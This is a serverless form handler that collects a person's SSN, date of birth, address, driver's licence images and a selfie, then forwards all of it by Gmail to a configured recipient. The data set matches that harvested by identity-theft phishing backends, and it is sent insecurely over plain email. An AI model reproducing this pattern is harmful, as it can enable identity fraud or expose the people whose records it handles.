import multer from "multer";
import nodemailer from "nodemailer";
import path from "path";

// Disable default body parser (needed for multer)
export const config = {
  api: {
    bodyParser: false,
  },
};

// Use memory storage (VERY IMPORTANT for Vercel)
const upload = multer({
  storage: multer.memoryStorage(),
});

// Helper to run multer in Vercel
function runMiddleware(req, res, fn) {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  try {
    // Handle file uploads
    await runMiddleware(
      req,
      res,
      upload.fields([
        { name: "driversLicenseFront", maxCount: 1 },
        { name: "driversLicenseBack", maxCount: 1 },
        { name: "selfie", maxCount: 1 },
      ])
    );

    const {
      fullName,
      lastName,
      phoneNumber,
      address,
      gender,
      dateOfBirth,
      ssn,
    } = req.body;

    const files = req.files || {};

    // Create email transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_PASS,
      },
    });

    // Prepare email
    let mailOptions = {
      from: process.env.GMAIL_USER,
      to: process.env.RECIPIENT_EMAIL,
      subject: "New Form Submission",
      text: `
Full Name: ${fullName}
Last Name: ${lastName}
Phone: ${phoneNumber}
Address: ${address}
Gender: ${gender}
DOB: ${dateOfBirth}
SSN: ${ssn}
      `,
      attachments: [],
    };

    // Attach files using BUFFER (not path!)
    if (files.driversLicenseFront) {
      mailOptions.attachments.push({
        filename:
          "drivers_license_front" +
          path.extname(files.driversLicenseFront[0].originalname),
        content: files.driversLicenseFront[0].buffer,
      });
    }

    if (files.driversLicenseBack) {
      mailOptions.attachments.push({
        filename:
          "drivers_license_back" +
          path.extname(files.driversLicenseBack[0].originalname),
        content: files.driversLicenseBack[0].buffer,
      });
    }

    if (files.selfie) {
      mailOptions.attachments.push({
        filename:
          "selfie" +
          path.extname(files.selfie[0].originalname),
        content: files.selfie[0].buffer,
      });
    }

    // Send email
    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: "Form submitted successfully" });

  } catch (error) {
    console.error("ERROR:", error);
    return res.status(500).json({ error: error.message });
  }
}